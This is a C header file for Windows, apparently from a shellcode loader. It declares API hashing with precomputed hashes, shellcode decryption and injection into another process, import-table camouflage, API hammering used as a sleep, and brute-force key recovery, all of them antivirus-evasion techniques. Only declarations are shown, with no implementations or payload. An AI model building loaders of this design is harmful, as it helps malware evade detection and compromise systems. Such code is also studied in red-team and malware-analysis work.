#pragma once

#include <windows.h>
#include "typedef.h"

// Hashing
#define KERNEL32DLL_HASH 0x367DC15A  // Hash of "KERNEL32.DLL"
#define OPENPROCESS_HASH 0xC88D2AEC // Hash of "OpenProcess"

// Keysize
#define KEYSIZE	16
#define HINT_BYTE 0x88

// API hashing
HMODULE GetModuleHandleH(DWORD moduleHash);
FARPROC GetProcAddressH(HMODULE hModule, DWORD functionHash);

// DecryptShellcode
VOID DecryptShellcode(PBYTE buf, SIZE_T bufSize, PBYTE pKey, PBYTE pIv);

// InjectShellcode
BOOL InjectShellcode(IN HANDLE hProcess, IN PVOID buf, IN SIZE_T bufSize);

// IAT camouflage
VOID Camo();

// OpenProc
HANDLE OpenProc(DWORD dwProcessId);

// Replace C toupper() function
CHAR _ToUpper(CHAR c);

// Replace the rand function
INT PseudoRandomIntegerSubroutine(PULONG Context);
INT GetPseudoRandomInteger();

//Replace the srand function
INT CreatePseudoRandomInteger(_In_ ULONG Seed);
void SetPseudoRandomSeed(ULONG Seed);

// Sleep
BOOL ApiHammering(DWORD Stress);

// Brute
BYTE BruteForceDecryption(BYTE hint, PBYTE pProtectedKey, SIZE_T keySize, PBYTE* ppRealKey);

// PrintHex
void PrintHex(IN PBYTE pBuf, IN SIZE_T sSize);

